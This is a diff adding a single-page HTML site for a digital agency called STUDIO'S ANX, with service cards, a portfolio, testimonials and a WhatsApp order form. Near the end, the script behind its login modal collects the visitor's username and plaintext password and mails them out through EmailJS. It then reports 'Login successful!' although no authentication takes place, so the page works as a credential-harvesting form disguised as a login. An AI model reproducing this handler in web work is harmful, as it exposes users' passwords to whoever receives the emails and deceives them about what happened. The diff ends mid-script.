@@ -1,0 +1,1162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>STUDIO'S ANX | Digital Agency & Community</title>
+  
+  <!-- Google Fonts: Inter -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  
+  <!-- FontAwesome for Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+  <!-- EmailJS SDK (v4) -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+  <style>
+    /* --- RESET & GLOBAL VARIABLES --- */
+    :root {
+      --bg-black: #000000;
+      --bg-card: rgba(255, 255, 255, 0.03);
+      --bg-card-hover: rgba(255, 255, 255, 0.07);
+      --border-white: rgba(255, 255, 255, 0.12);
+      --border-white-glow: rgba(255, 255, 255, 0.5);
+      --text-white: #ffffff;
+      --text-dim: #a0a0a0;
+      --transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+
+    html {
+      scroll-behavior: smooth;
+      background-color: var(--bg-black);
+      color: var(--text-white);
+    }
+
+    body {
+      overflow-x: hidden;
+      line-height: 1.6;
+      background: radial-gradient(circle at 50% 0%, #151515 0%, #000000 70%);
+      min-height: 100vh;
+    }
+
+    /* --- TYPOGRAPHY & UTILITIES --- */
+    h1, h2, h3, h4 {
+      letter-spacing: -0.03em;
+      font-weight: 700;
+    }
+
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 24px;
+    }
+
+    .section {
+      padding: 120px 0;
+    }
+
+    .section-title {
+      font-size: 2.5rem;
+      text-align: center;
+      margin-bottom: 16px;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+    }
+
+    .section-subtitle {
+      text-align: center;
+      color: var(--text-dim);
+      font-size: 1.1rem;
+      margin-bottom: 60px;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    /* --- GLASSMORPHISM CARD --- */
+    .glass-card {
+      background: var(--bg-card);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border: 1px solid var(--border-white);
+      border-radius: 16px;
+      transition: var(--transition);
+    }
+
+    .glass-card:hover {
+      background: var(--bg-card-hover);
+      border-color: var(--border-white-glow);
+      transform: translateY(-5px);
+    }
+
+    /* --- ANIMATED BUTTONS --- */
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      padding: 16px 32px;
+      font-size: 0.95rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      text-decoration: none;
+      border-radius: 50px;
+      background-color: var(--bg-black);
+      color: var(--text-white);
+      border: 1px solid var(--text-white);
+      cursor: pointer;
+      transition: var(--transition);
+      position: relative;
+    }
+
+    .btn-primary:hover {
+      background-color: var(--text-white);
+      color: var(--bg-black);
+      box-shadow: 0 0 25px rgba(255, 255, 255, 0.6);
+      transform: translateY(-2px);
+    }
+
+    .btn-secondary {
+      border-color: var(--border-white);
+      color: var(--text-dim);
+    }
+
+    .btn-secondary:hover {
+      border-color: var(--text-white);
+      color: var(--text-white);
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
+    }
+
+    .btn-nav-login {
+      padding: 8px 20px;
+      font-size: 0.85rem;
+      border-radius: 20px;
+      background: transparent;
+      border: 1px solid var(--border-white-glow);
+      color: var(--text-white);
+    }
+
+    .btn-nav-login:hover {
+      background: var(--text-white);
+      color: var(--bg-black);
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.4);
+    }
+
+    /* --- NAVBAR --- */
+    .navbar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      z-index: 1000;
+      padding: 20px 0;
+      transition: var(--transition);
+      background: rgba(0, 0, 0, 0.8);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+    }
+
+    .navbar .container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .nav-right {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+    }
+
+    .logo {
+      font-size: 1.4rem;
+      font-weight: 800;
+      letter-spacing: 2px;
+      text-decoration: none;
+      color: var(--text-white);
+    }
+
+    .nav-links {
+      display: flex;
+      gap: 32px;
+      list-style: none;
+      align-items: center;
+    }
+
+    .nav-links a {
+      text-decoration: none;
+      color: var(--text-dim);
+      font-size: 0.9rem;
+      font-weight: 500;
+      transition: var(--transition);
+    }
+
+    .nav-links a:hover {
+      color: var(--text-white);
+    }
+
+    .mobile-toggle {
+      display: none;
+      font-size: 1.5rem;
+      color: var(--text-white);
+      cursor: pointer;
+    }
+
+    /* --- HERO SECTION --- */
+    .hero {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding-top: 100px;
+      position: relative;
+    }
+
+    .hero-title {
+      font-size: 4.5rem;
+      font-weight: 800;
+      line-height: 1.1;
+      margin-bottom: 20px;
+      background: linear-gradient(180deg, #FFFFFF 0%, #777777 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .hero-subtitle {
+      font-size: 1.25rem;
+      color: var(--text-dim);
+      margin-bottom: 40px;
+      font-weight: 400;
+      letter-spacing: 1px;
+    }
+
+    .hero-buttons {
+      display: flex;
+      gap: 20px;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+
+    /* --- ABOUT SECTION --- */
+    .about-content {
+      padding: 48px;
+      text-align: center;
+      max-width: 900px;
+      margin: 0 auto;
+    }
+
+    .about-text {
+      font-size: 1.2rem;
+      color: var(--text-dim);
+      line-height: 1.8;
+    }
+
+    /* --- SERVICES SECTION --- */
+    .services-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 24px;
+    }
+
+    .service-card {
+      padding: 40px 30px;
+      text-align: left;
+      cursor: pointer;
+      position: relative;
+    }
+
+    .service-card::after {
+      content: "Click for Examples & Order →";
+      display: block;
+      margin-top: 15px;
+      font-size: 0.8rem;
+      color: var(--text-white);
+      font-weight: 600;
+      opacity: 0.7;
+    }
+
+    .service-icon {
+      font-size: 2.2rem;
+      margin-bottom: 24px;
+      color: var(--text-white);
+    }
+
+    .service-card h3 {
+      font-size: 1.3rem;
+      margin-bottom: 12px;
+    }
+
+    .service-card p {
+      color: var(--text-dim);
+      font-size: 0.95rem;
+    }
+
+    /* --- PORTFOLIO SECTION --- */
+    .portfolio-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+      gap: 24px;
+    }
+
+    .portfolio-item {
+      position: relative;
+      overflow: hidden;
+      border-radius: 16px;
+      height: 260px;
+      border: 1px solid var(--border-white);
+      cursor: pointer;
+    }
+
+    .portfolio-bg {
+      width: 100%;
+      height: 100%;
+      background-size: cover;
+      background-position: center;
+      transition: transform 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+      filter: grayscale(100%) contrast(120%);
+    }
+
+    .portfolio-overlay {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(180deg, rgba(0,0,0,0) 20%, rgba(0,0,0,0.9) 100%);
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-end;
+      padding: 24px;
+      transition: var(--transition);
+    }
+
+    .portfolio-item:hover .portfolio-bg {
+      transform: scale(1.1);
+      filter: grayscale(0%);
+    }
+
+    .portfolio-item h3 {
+      font-size: 1.2rem;
+    }
+
+    .portfolio-item p {
+      font-size: 0.85rem;
+      color: var(--text-dim);
+    }
+
+    /* --- COMMUNITY SECTION --- */
+    .community-box {
+      padding: 60px 30px;
+      text-align: center;
+      background: radial-gradient(circle at center, rgba(255,255,255,0.05) 0%, rgba(0,0,0,0) 70%);
+    }
+
+    .community-buttons {
+      display: flex;
+      gap: 20px;
+      justify-content: center;
+      margin-top: 32px;
+      flex-wrap: wrap;
+    }
+
+    /* --- TESTIMONIALS SECTION --- */
+    .testimonials-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 24px;
+    }
+
+    .testimonial-card {
+      padding: 32px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+
+    .testimonial-text {
+      font-style: italic;
+      color: var(--text-dim);
+      margin-bottom: 24px;
+      font-size: 0.95rem;
+    }
+
+    .testimonial-author h4 {
+      font-size: 1rem;
+    }
+
+    .testimonial-author p {
+      font-size: 0.8rem;
+      color: var(--text-dim);
+    }
+
+    /* --- CONTACT SECTION --- */
+    .contact-wrapper {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 40px;
+    }
+
+    .contact-info {
+      display: flex;
+      flex-direction: column;
+      gap: 24px;
+      justify-content: center;
+    }
+
+    .social-links {
+      display: flex;
+      gap: 16px;
+      margin-top: 16px;
+    }
+
+    .social-icon {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      border: 1px solid var(--border-white);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--text-white);
+      text-decoration: none;
+      transition: var(--transition);
+    }
+
+    .social-icon:hover {
+      border-color: var(--text-white);
+      background-color: var(--text-white);
+      color: var(--bg-black);
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.4);
+    }
+
+    .contact-form {
+      padding: 40px;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    .form-group {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .form-group label {
+      font-size: 0.85rem;
+      color: var(--text-dim);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .form-control {
+      background: rgba(0, 0, 0, 0.5);
+      border: 1px solid var(--border-white);
+      padding: 14px 18px;
+      border-radius: 8px;
+      color: var(--text-white);
+      font-size: 0.95rem;
+      outline: none;
+      transition: var(--transition);
+    }
+
+    .form-control:focus {
+      border-color: var(--text-white);
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+    }
+
+    textarea.form-control {
+      resize: vertical;
+      min-height: 120px;
+    }
+
+    /* --- LOGIN MODAL & SERVICE MODALS --- */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.85);
+      backdrop-filter: blur(10px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 2000;
+      opacity: 0;
+      pointer-events: none;
+      transition: var(--transition);
+      padding: 20px;
+    }
+
+    .modal-overlay.active {
+      opacity: 1;
+      pointer-events: all;
+    }
+
+    .login-card {
+      width: 100%;
+      max-width: 400px;
+      padding: 40px;
+      position: relative;
+      background: rgba(15, 15, 15, 0.95);
+      box-shadow: 0 0 40px rgba(255, 255, 255, 0.1);
+    }
+
+    .service-modal-card {
+      width: 100%;
+      max-width: 700px;
+      max-height: 85vh;
+      overflow-y: auto;
+      padding: 30px;
+      position: relative;
+      background: rgba(15, 15, 15, 0.95);
+      box-shadow: 0 0 40px rgba(255, 255, 255, 0.15);
+    }
+
+    .close-modal {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      color: var(--text-dim);
+      font-size: 1.2rem;
+      cursor: pointer;
+      transition: var(--transition);
+    }
+
+    .close-modal:hover {
+      color: var(--text-white);
+    }
+
+    /* Service Details Inside Modal */
+    .service-modal-header {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      margin-bottom: 15px;
+    }
+
+    .service-modal-header i {
+      font-size: 2rem;
+    }
+
+    .sample-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 15px;
+      margin: 20px 0;
+    }
+
+    .sample-img {
+      width: 100%;
+      height: 130px;
+      object-fit: cover;
+      border-radius: 8px;
+      border: 1px solid var(--border-white);
+    }
+
+    .sample-feature-list {
+      list-style: none;
+      margin: 15px 0;
+    }
+
+    .sample-feature-list li {
+      color: var(--text-dim);
+      font-size: 0.9rem;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .sample-feature-list li i {
+      color: var(--text-white);
+    }
+
+    /* --- FOOTER --- */
+    footer {
+      border-top: 1px solid var(--border-white);
+      padding: 40px 0;
+      text-align: center;
+      font-size: 0.85rem;
+      color: var(--text-dim);
+    }
+
+    /* --- ANIMATION FIX FOR MOBILE / PREVIEW --- */
+    .fade-in {
+      opacity: 1;
+      transform: translateY(0);
+      transition: opacity 0.8s ease, transform 0.8s ease;
+    }
+
+    /* --- RESPONSIVE DESIGN --- */
+    @media (max-width: 900px) {
+      .contact-wrapper {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    @media (max-width: 768px) {
+      .hero-title {
+        font-size: 2.8rem;
+      }
+
+      .nav-links {
+        position: fixed;
+        top: 70px;
+        right: -100%;
+        width: 100%;
+        height: calc(100vh - 70px);
+        background: var(--bg-black);
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        gap: 32px;
+        transition: var(--transition);
+      }
+
+      .nav-links.active {
+        right: 0;
+      }
+
+      .mobile-toggle {
+        display: block;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- NAVBAR -->
+  <nav class="navbar">
+    <div class="container">
+      <a href="#home" class="logo">STUDIO'S ANX</a>
+      <div class="nav-right">
+        <ul class="nav-links" id="nav-links">
+          <li><a href="#home">Home</a></li>
+          <li><a href="#about">About</a></li>
+          <li><a href="#services">Services</a></li>
+          <li><a href="#portfolio">Portfolio</a></li>
+          <li><a href="#community">Community</a></li>
+          <li><a href="#contact">Contact</a></li>
+          <li class="mobile-only-login"><a href="#" id="login-link-mobile">Login</a></li>
+        </ul>
+        
+        <button class="btn btn-nav-login" id="open-login-btn">
+          <i class="fa-solid fa-user"></i> Login
+        </button>
+
+        <div class="mobile-toggle" id="mobile-toggle">
+          <i class="fa-solid fa-bars"></i>
+        </div>
+      </div>
+    </div>
+  </nav>
+
+  <!-- HERO SECTION -->
+  <section id="home" class="hero">
+    <div class="container fade-in">
+      <h1 class="hero-title">STUDIO'S ANX</h1>
+      <p class="hero-subtitle">Bots | Web Dev | Graphic Design | Ads</p>
+      <div class="hero-buttons">
+        <a href="#community" class="btn btn-primary"><i class="fa-brands fa-discord"></i> Join Community</a>
+        <a href="#services" class="btn btn-secondary">Our Services</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- ABOUT SECTION -->
+  <section id="about" class="section">
+    <div class="container fade-in">
+      <h2 class="section-title">Who We Are</h2>
+      <p class="section-subtitle">Driven by precision, modern aesthetic, and elite execution.</p>
+      <div class="glass-card about-content">
+        <p class="about-text">
+          STUDIO'S ANX is a premium digital collective and service hub. We specialize in engineering bespoke Discord & Telegram bots, building cutting-edge modern websites, crafting iconic visual graphics, and deploying high-converting digital ad campaigns.
+        </p>
+      </div>
+    </div>
+  </section>
+
+  <!-- SERVICES SECTION -->
+  <section id="services" class="section">
+    <div class="container fade-in">
+      <h2 class="section-title">Our Capabilities</h2>
+      <p class="section-subtitle">Click on any card to view examples, details, and order options.</p>
+      
+      <div class="services-grid">
+        <div class="glass-card service-card" onclick="openServiceModal('bot')">
+          <i class="fa-solid fa-robot service-icon"></i>
+          <h3>Bot Development</h3>
+          <p>Custom Discord & Telegram automation, payment integration, moderation tools, and API connections.</p>
+        </div>
+
+        <div class="glass-card service-card" onclick="openServiceModal('web')">
+          <i class="fa-solid fa-code service-icon"></i>
+          <h3>Web Development</h3>
+          <p>High-speed, responsive, minimalist web applications with seamless animations and UX design.</p>
+        </div>
+
+        <div class="glass-card service-card" onclick="openServiceModal('graphic')">
+          <i class="fa-solid fa-pen-nib service-icon"></i>
+          <h3>Graphic Design</h3>
+          <p>Branding identities, UI design, vector banners, social media assets, and vector line art.</p>
+        </div>
+
+        <div class="glass-card service-card" onclick="openServiceModal('ads')">
+          <i class="fa-solid fa-rectangle-ad service-icon"></i>
+          <h3>Social Media Ads</h3>
+          <p>Targeted ad campaign strategy, creative copywriting, and analytics tracking for maximum ROI.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- PORTFOLIO SECTION -->
+  <section id="portfolio" class="section">
+    <div class="container fade-in">
+      <h2 class="section-title">Selected Work</h2>
+      <p class="section-subtitle">A showcase of recent agency projects and client builds.</p>
+      
+      <div class="portfolio-grid">
+        <div class="portfolio-item" onclick="openServiceModal('bot')">
+          <div class="portfolio-bg" style="background-image: url('https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&w=800&q=80');"></div>
+          <div class="portfolio-overlay">
+            <h3>Automated Economy Bot</h3>
+            <p>Discord Infrastructure / Node.js</p>
+          </div>
+        </div>
+
+        <div class="portfolio-item" onclick="openServiceModal('web')">
+          <div class="portfolio-bg" style="background-image: url('https://images.unsplash.com/photo-1607604276583-eef5d076aa5f?auto=format&fit=crop&w=800&q=80');"></div>
+          <div class="portfolio-overlay">
+            <h3>Monochrome E-Commerce</h3>
+            <p>Web Development / React</p>
+          </div>
+        </div>
+
+        <div class="portfolio-item" onclick="openServiceModal('graphic')">
+          <div class="portfolio-bg" style="background-image: url('https://images.unsplash.com/photo-1634017839464-5c339ebe3cb4?auto=format&fit=crop&w=800&q=80');"></div>
+          <div class="portfolio-overlay">
+            <h3>Minimal Brand Identity</h3>
+            <p>Graphic Design / Vector</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- COMMUNITY SECTION -->
+  <section id="community" class="section">
+    <div class="container fade-in">
+      <div class="glass-card community-box">
+        <h2 class="section-title">Join The Hub</h2>
+        <p class="section-subtitle" style="margin-bottom: 0;">Connect with creators, developers, and entrepreneurs inside our official channels.</p>
+        <div class="community-buttons">
+          <a href="#" class="btn btn-primary"><i class="fa-brands fa-discord"></i> Discord Server</a>
+          <a href="#" class="btn btn-secondary"><i class="fa-brands fa-telegram"></i> Telegram Channel</a>
+          <a href="https://whatsapp.com/channel/YOUR_CHANNEL_LINK" target="_blank" class="btn btn-secondary"><i class="fa-brands fa-whatsapp"></i> WhatsApp Channel</a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- TESTIMONIALS SECTION -->
+  <section class="section">
+    <div class="container fade-in">
+      <h2 class="section-title">Client Feedback</h2>
+      <p class="section-subtitle">What partners say about working with STUDIO'S ANX.</p>
+      
+      <div class="testimonials-grid">
+        <div class="glass-card testimonial-card">
+          <p class="testimonial-text">"STUDIO'S ANX built our community bot in record time. Handles 50k+ active members without a single glitch."</p>
+          <div class="testimonial-author">
+            <h4>Alex Rivera</h4>
+            <p>Community Director</p>
+          </div>
+        </div>
+
+        <div class="glass-card testimonial-card">
+          <p class="testimonial-text">"The aesthetic standard of their web dev work is unmatched. Clean, ultra-fast, and elevated our brand image completely."</p>
+          <div class="testimonial-author">
+            <h4>Elena Rostova</h4>
+            <p>Founder, Vantage Agency</p>
+          </div>
+        </div>
+
+        <div class="glass-card testimonial-card">
+          <p class="testimonial-text">"Exceptional graphic design speed and creative ad copy. Our campaign conversion rate went up 40%."</p>
+          <div class="testimonial-author">
+            <h4>Marcus Vance</h4>
+            <p>CMO, Digital Edge</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- CONTACT / ORDER SECTION -->
+  <section id="contact" class="section">
+    <div class="container fade-in">
+      <h2 class="section-title">Get In Touch / Place Order</h2>
+      <p class="section-subtitle">Ready to start a project? Fill out the details to place an order via WhatsApp instantly.</p>
+
+      <div class="contact-wrapper">
+        <div class="contact-info">
+          <h3>Let's build together.</h3>
+          <p style="color: var(--text-dim);">Have a custom request or need a quick consultation? Reach out via form or through our official social media handles.</p>
+          
+          <div class="social-links">
+            <a href="#" class="social-icon"><i class="fa-brands fa-discord"></i></a>
+            <a href="#" class="social-icon"><i class="fa-brands fa-telegram"></i></a>
+            <a href="https://whatsapp.com/channel/YOUR_CHANNEL_LINK" target="_blank" class="social-icon"><i class="fa-brands fa-whatsapp"></i></a>
+            <a href="#" class="social-icon"><i class="fa-brands fa-x-twitter"></i></a>
+            <a href="#" class="social-icon"><i class="fa-brands fa-github"></i></a>
+          </div>
+        </div>
+
+        <!-- Order Form (Direct WhatsApp Trigger) -->
+        <form class="glass-card contact-form" id="order-form">
+          <div class="form-group">
+            <label for="name">Name</label>
+            <input type="text" id="name" class="form-control" placeholder="Your Name" required>
+          </div>
+          <div class="form-group">
+            <label for="email">Email</label>
+            <input type="email" id="email" class="form-control" placeholder="your@email.com" required>
+          </div>
+          <div class="form-group">
+            <label for="service">Select Service</label>
+            <select id="service" class="form-control" required style="background: rgba(0, 0, 0, 0.8);">
+              <option value="Bot Development">Bot Development</option>
+              <option value="Web Development">Web Development</option>
+              <option value="Graphic Design">Graphic Design</option>
+              <option value="Social Media Ads">Social Media Ads</option>
+            </select>
+          </div>
+
+          <!-- Dynamic Graphic Design Fields -->
+          <div id="graphic-design-fields" style="display: none; flex-direction: column; gap: 20px;">
+            <div class="form-group">
+              <label for="thumbnail-name">Thumbnail Name / Title</label>
+              <input type="text" id="thumbnail-name" class="form-control" placeholder="e.g. How to Make Money Online">
+            </div>
+            <div class="form-group">
+              <label for="color-theme">Preferred Colors</label>
+              <input type="text" id="color-theme" class="form-control" placeholder="e.g. Red and Black">
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label for="message">Order Details / Message</label>
+            <textarea id="message" class="form-control" placeholder="Tell us about your project requirement..." required></textarea>
+          </div>
+          <button type="submit" class="btn btn-primary" style="width: 100%;">Send Order via WhatsApp</button>
+        </form>
+      </div>
+    </div>
+  </section>
+
+  <!-- SERVICE DETAILS MODAL (POPUP) -->
+  <div class="modal-overlay" id="service-modal">
+    <div class="glass-card service-modal-card">
+      <i class="fa-solid fa-xmark close-modal" onclick="closeServiceModal()"></i>
+      <div id="service-modal-body">
+        <!-- Content injects via JS -->
+      </div>
+    </div>
+  </div>
+
+  <!-- LOGIN MODAL -->
+  <div class="modal-overlay" id="login-modal">
+    <div class="glass-card login-card">
+      <i class="fa-solid fa-xmark close-modal" id="close-login-btn"></i>
+      <h2 style="text-align: center; margin-bottom: 8px;">Welcome Back</h2>
+      <p style="text-align: center; color: var(--text-dim); font-size: 0.9rem; margin-bottom: 24px;">Login to access your dashboard</p>
+      
+      <form id="login-form">
+        <div class="form-group" style="margin-bottom: 16px;">
+          <label for="login-email">Email or Username</label>
+          <input type="text" id="login-email" class="form-control" placeholder="Enter your email" required>
+        </div>
+        <div class="form-group" style="margin-bottom: 24px;">
+          <label for="login-password">Password</label>
+          <input type="password" id="login-password" class="form-control" placeholder="••••••••" required>
+        </div>
+        <button type="submit" class="btn btn-primary" id="login-submit-btn" style="width: 100%;">Login</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <footer>
+    <div class="container">
+      <p>&copy; 2026 STUDIO'S ANX. All rights reserved. Minimal & Premium Agency Experience.</p>
+    </div>
+  </footer>
+
+  <!-- JS INTERACTIVITY -->
+  <script>
+    // Initialize EmailJS with Public Key
+    (function() {
+      emailjs.init("Ri93ZrOpPx8ioLBoc");
+    })();
+
+    // Mobile Nav Toggle
+    const mobileToggle = document.getElementById('mobile-toggle');
+    const navLinks = document.getElementById('nav-links');
+
+    if(mobileToggle) {
+      mobileToggle.addEventListener('click', () => {
+        navLinks.classList.toggle('active');
+      });
+    }
+
+    document.querySelectorAll('.nav-links a').forEach(link => {
+      link.addEventListener('click', () => {
+        navLinks.classList.remove('active');
+      });
+    });
+
+    // Service Modal Data & Logic
+    const serviceData = {
+      bot: {
+        title: "Bot Development",
+        icon: "fa-robot",
+        description: "Custom automated Discord and Telegram bots tailored for moderating communities, managing economy systems, integrating crypto/fiat payment gateways, and backend API connections.",
+        features: [
+          "Discord Slash Commands & Button Menus",
+          "Telegram Bot API & Webhook Systems",
+          "Automated Payments & VIP Roles",
+          "Database Management (MongoDB/MySQL)"
+        ],
+        images: [
+          "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&w=400&q=80",
+          "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=400&q=80"
+        ],
+        serviceName: "Bot Development"
+      },
+      web: {
+        title: "Web Development",
+        icon: "fa-code",
+        description: "Modern, high-performance websites built with clean code and minimalist dark/cyberpunk aesthetic. Optimized for fast loading times and mobile responsiveness.",
+        features: [
+          "Single-Page & Multi-Page Web Apps",
+          "Glassmorphism & Interactive UI/UX",
+          "WhatsApp Order & EmailJS Form Integration",
+          "SEO Optimized & Fast Loading Speeds"
+        ],
+        images: [
+          "https://images.unsplash.com/photo-1607604276583-eef5d076aa5f?auto=format&fit=crop&w=400&q=80",
+          "https://images.unsplash.com/photo-1507238691740-187a5b1d37b8?auto=format&fit=crop&w=400&q=80"
+        ],
+        serviceName: "Web Development"
+      },
+      graphic: {
+        title: "Graphic Design",
+        icon: "fa-pen-nib",
+        description: "Clean vector designs, anime line-art, branding identities, social media covers, and high-converting YouTube thumbnails designed to grab instant attention.",
+        features: [
+          "Anime Vector & Line Art Illustrations",
+          "YouTube Thumbnails & Social Banners",
+          "Brand Logos & Visual Identities",
+          "Photoshop & Ibis Paint Professional Quality"
+        ],
+        images: [
+          "https://images.unsplash.com/photo-1634017839464-5c339ebe3cb4?auto=format&fit=crop&w=400&q=80",
+          "https://images.unsplash.com/photo-1626785774573-4b799315345d?auto=format&fit=crop&w=400&q=80"
+        ],
+        serviceName: "Graphic Design"
+      },
+      ads: {
+        title: "Social Media Ads",
+        icon: "fa-rectangle-ad",
+        description: "Strategic digital ad management for Meta, Google, and TikTok. We craft engaging ad creatives and targeted strategy for maximum engagement and sales.",
+        features: [
+          "High-CTR Ad Banner & Video Creatives",
+          "Target Audience Research & Setup",
+          "Copywriting Designed for Conversions",
+          "Analytics & Campaign Optimization"
+        ],
+        images: [
+          "https://images.unsplash.com/photo-1460925895917-afdab827c52f?auto=format&fit=crop&w=400&q=80",
+          "https://images.unsplash.com/photo-1557838923-2985c318be48?auto=format&fit=crop&w=400&q=80"
+        ],
+        serviceName: "Social Media Ads"
+      }
+    };
+
+    function openServiceModal(key) {
+      const data = serviceData[key];
+      if (!data) return;
+
+      const modalBody = document.getElementById('service-modal-body');
+      modalBody.innerHTML = `
+        <div class="service-modal-header">
+          <i class="fa-solid ${data.icon}"></i>
+          <h2>${data.title}</h2>
+        </div>
+        <p style="color: var(--text-dim); margin-bottom: 15px;">${data.description}</p>
+        
+        <h4 style="margin-top: 20px;">Key Capabilities:</h4>
+        <ul class="sample-feature-list">
+          ${data.features.map(f => `<li><i class="fa-solid fa-check"></i> ${f}</li>`).join('')}
+        </ul>
+
+        <h4 style="margin-top: 20px;">Sample Preview / Examples:</h4>
+        <div class="sample-grid">
+          ${data.images.map(img => `<img src="${img}" class="sample-img" alt="Sample Work">`).join('')}
+        </div>
+
+        <button class="btn btn-primary" style="width: 100%; margin-top: 20px;" onclick="selectServiceAndOrder('${data.serviceName}')">
+          Order ${data.title} Now
+        </button>
+      `;
+
+      document.getElementById('service-modal').classList.add('active');
+    }
+
+    function closeServiceModal() {
+      document.getElementById('service-modal').classList.remove('active');
+    }
+
+    function selectServiceAndOrder(serviceName) {
+      closeServiceModal();
+      const serviceSelect = document.getElementById('service');
+      if (serviceSelect) {
+        serviceSelect.value = serviceName;
+        serviceSelect.dispatchEvent(new Event('change'));
+      }
+      document.getElementById('contact').scrollIntoView({ behavior: 'smooth' });
+    }
+
+    // Close Service Modal on Overlay Click
+    const serviceModalOverlay = document.getElementById('service-modal');
+    if (serviceModalOverlay) {
+      serviceModalOverlay.addEventListener('click', (e) => {
+        if (e.target === serviceModalOverlay) {
+          closeServiceModal();
+        }
+      });
+    }
+
+    // Login Modal Toggle
+    const loginModal = document.getElementById('login-modal');
+    const openLoginBtn = document.getElementById('open-login-btn');
+    const closeLoginBtn = document.getElementById('close-login-btn');
+    const mobileLoginLink = document.getElementById('login-link-mobile');
+
+    if(openLoginBtn) {
+      openLoginBtn.addEventListener('click', () => {
+        loginModal.classList.add('active');
+      });
+    }
+
+    if(mobileLoginLink) {
+      mobileLoginLink.addEventListener('click', (e) => {
+        e.preventDefault();
+        loginModal.classList.add('active');
+      });
+    }
+
+    if(closeLoginBtn) {
+      closeLoginBtn.addEventListener('click', () => {
+        loginModal.classList.remove('active');
+      });
+    }
+
+    if(loginModal) {
+      loginModal.addEventListener('click', (e) => {
+        if (e.target === loginModal) {
+          loginModal.classList.remove('active');
+        }
+      });
+    }
+
+    // EmailJS Login Form Handler
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const submitBtn = document.getElementById('login-submit-btn');
+      submitBtn.innerText = "Processing...";
+      submitBtn.disabled = true;
+
+      const userEmail = document.getElementById('login-email').value;
+      const userPass = document.getElementById('login-password').value;
+
+      const templateParams = {
+        user_email: userEmail,
+        user_password: userPass
+      };
+
+      // Send via EmailJS Service ID and Template ID
+      emailjs.send("service_c9dit18", "template_itxopwm", templateParams)
+        .then(function(response) {
+          alert("Login successful!");
+          submitBtn.innerText = "Login";
+          submitBtn.disabled = false;
+          loginModal.classList.remove('active');
+          document.getElementById('login-form').reset();
+        }, function(error) {
+          alert("Login error. Please try again.");
+          submitBtn.innerText = "Login";
+          submitBtn.disabled = false;
+          console.error('EmailJS Error:', error);
+        });
+    });
+
+    // Dynamic Fields Logic for Graphic Design Service
